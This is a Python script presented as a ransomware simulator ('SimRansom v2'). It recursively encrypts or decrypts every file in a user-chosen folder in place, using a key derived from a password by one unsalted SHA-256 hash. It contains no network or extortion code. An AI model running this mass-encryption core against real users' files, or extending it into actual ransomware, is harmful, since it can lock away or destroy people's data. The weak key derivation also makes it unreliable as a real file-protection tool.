#!/usr/bin/env python3
import os
import sys
import base64
import hashlib
from cryptography.fernet import Fernet
from getpass import getpass
from colorama import Fore, init
from datetime import datetime

init(autoreset=True)

def generate_key(password):
    key = hashlib.sha256(password.encode()).digest()
    return Fernet(base64.urlsafe_b64encode(key))

def encrypt_file(file_path, fernet):
    try:
        with open(file_path, 'rb') as file:
            original = file.read()
        encrypted = fernet.encrypt(original)
        with open(file_path, 'wb') as encrypted_file:
            encrypted_file.write(encrypted)
    except Exception as e:
        print(Fore.RED + f"Encryption failed for {file_path}: {e}")

def decrypt_file(file_path, fernet):
    try:
        with open(file_path, 'rb') as enc_file:
            encrypted = enc_file.read()
        decrypted = fernet.decrypt(encrypted)
        with open(file_path, 'wb') as dec_file:
            dec_file.write(decrypted)
    except Exception as e:
        print(Fore.RED + f"Decryption failed for {file_path}: {e}")

def process_folder(folder, fernet, mode):
    for root, _, files in os.walk(folder):
        for file in files:
            filepath = os.path.join(root, file)
            if mode == 'lock':
                encrypt_file(filepath, fernet)
            elif mode == 'unlock':
                decrypt_file(filepath, fernet)

def main():
    try:
        print(Fore.CYAN + "🔐 SimRansom v2 — Advanced File Locker")
        mode = input("🔄 Mode (lock/unlock): ").strip().lower()
        if mode not in ['lock', 'unlock']:
            print(Fore.RED + "❌ Invalid mode.")
            return

        folder = input("📁 Enter target folder path: ").strip()
        if not os.path.isdir(folder):
            print(Fore.RED + "❌ Invalid folder path.")
            return

        password = getpass("🔑 Enter password: ")
        fernet = generate_key(password)

        print(Fore.YELLOW + f"⚙️ Processing '{folder}' in {mode} mode...")
        process_folder(folder, fernet, mode)
        print(Fore.GREEN + f"✅ Successfully completed {mode} operation.")

    except KeyboardInterrupt:
        print(Fore.RED + "\n⛔ Operation cancelled by user.")
        sys.exit(1)

if __name__ == "__main__":
    main()
